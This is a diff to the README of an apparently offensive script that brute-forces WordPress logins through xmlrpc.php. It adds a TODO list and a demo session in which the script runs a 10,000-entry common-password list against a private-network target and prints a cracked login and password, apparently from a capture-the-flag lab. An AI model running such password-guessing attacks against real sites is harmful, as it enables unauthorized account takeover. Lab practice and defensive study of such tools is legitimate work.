@@ -24,9 +24,30 @@ If you get an ```xml.etree.ElementTree.ParseError```:
 * Did you forget to add 'xmlrpc' in the url ?
 * Try to add or remove 'https' or 'www'.
 
-I'm working on the Exception Handling and 'userlist' enumeration.
+## TODO
+
+* Exception Handling for xml.etree.ElementTree.ParseError
+* 'userlist' enumeration
 
 ## Demo
 
-<img src="https://i.imgur.com/4XxCtVL.png">
+```bash
+MacBook-Pro: kavish$ python3 xmlrpcbruteforce.py http://192.168.100.34/xmlrpc.php 10k-most-common.txt elliot
+
+---------------Examining Target--------------------
+
+[>] Target is vulnerable.
+
+--=[Target: http://192.168.100.34/xmlrpc.php]=--
+
+        	[...Bruteforcing...]
+--=[Tried: 1000 passwords]=--
+--=[Tried: 2000 passwords]=--
+--=[Tried: 3000 passwords]=--
+--------------- BRUTEFORCE SUCCESSFULL  ---------------
+--=[User found]=--
+Login: elliot
+Password: ER28-0652
+--=[Exiting...]=--
+```
 
